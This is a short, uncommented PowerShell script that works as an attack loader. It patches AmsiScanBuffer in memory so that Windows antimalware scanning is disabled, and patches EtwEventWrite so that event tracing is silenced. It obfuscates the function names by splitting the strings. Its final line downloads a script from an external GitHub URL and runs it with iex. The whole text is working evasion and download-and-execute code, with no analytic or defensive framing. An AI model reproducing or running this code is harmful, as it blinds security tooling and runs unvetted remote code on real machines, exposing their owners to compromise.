$k=Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string p);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,uint s,uint n,out uint o);' -Name K -PassThru
$o=0
$a=$k::GetProcAddress($k::LoadLibrary('amsi'+'.dll'),'AmsiScan'+'Buffer')
[void]$k::VirtualProtect($a,3,0x40,[ref]$o);[Runtime.InteropServices.Marshal]::Copy([byte[]](0x31,0xC0,0xC3),0,$a,3)
$e=$k::GetProcAddress($k::LoadLibrary('ntdll'+'.dll'),'EtwEvent'+'Write')
[void]$k::VirtualProtect($e,1,0x40,[ref]$o);[Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3),0,$e,1)
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ThyCoder2/awshucksman/main/s.ps1')